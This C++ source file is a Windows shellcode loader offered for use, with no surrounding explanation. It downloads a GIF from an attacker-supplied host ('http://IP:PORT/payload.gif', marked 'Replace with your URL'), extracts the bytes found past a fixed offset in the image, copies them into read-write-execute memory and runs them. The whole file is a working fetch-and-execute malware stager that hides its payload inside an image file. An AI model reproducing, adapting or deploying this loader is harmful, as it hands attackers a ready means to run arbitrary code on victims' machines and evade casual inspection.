#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <vector>
#include <fstream>

#pragma comment(lib, "wininet.lib")

const char* imageURL = "http://IP:PORT/payload.gif"; // Replace with your URL
const char* imageFilename = "payload.gif";
const size_t shellcodeOffset = 3713162;

bool downloadImage(const char* url, const char* outputFile) {
    HINTERNET hInternet = InternetOpenA("ShellcodeRunner", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "[!] InternetOpenA failed." << std::endl;
        return false;
    }

    HINTERNET hFile = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        std::cerr << "[!] InternetOpenUrlA failed. Check URL: " << url << std::endl;
        InternetCloseHandle(hInternet);
        return false;
    }

    std::ofstream outFile(outputFile, std::ios::binary);
    if (!outFile) {
        std::cerr << "[!] Failed to open output file: " << outputFile << std::endl;
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return false;
    }

    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
        outFile.write(buffer, bytesRead);
    }

    outFile.close();
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
    std::cout << "[+] File downloaded successfully: " << outputFile << std::endl;
    return true;
}

int main() {
    std::cout << "[*] Downloading image from: " << imageURL << std::endl;
    if (!downloadImage(imageURL, imageFilename)) {
        return 1;
    }

    std::ifstream file(imageFilename, std::ios::binary | std::ios::ate);
    if (!file) {
        std::cerr << "[!] Failed to open downloaded image." << std::endl;
        return 1;
    }

    std::streamsize fileSize = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<char> buffer(fileSize);
    if (!file.read(buffer.data(), fileSize)) {
        std::cerr << "[!] Error reading image file." << std::endl;
        return 1;
    }

    size_t shellcodeSize = fileSize - shellcodeOffset;
    std::cout << "[+] Extracted shellcode size: " << shellcodeSize << " bytes" << std::endl;

    void* execMem = VirtualAlloc(nullptr, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        std::cerr << "[!] Failed to allocate executable memory." << std::endl;
        return 1;
    }

    memcpy(execMem, buffer.data() + shellcodeOffset, shellcodeSize);

    std::cout << "[*] Executing shellcode..." << std::endl;
    reinterpret_cast<void(*)()>(execMem)();

    std::cout << "[!] Execution returned. Shellcode might have failed or exited." << std::endl;
    return 0;
}
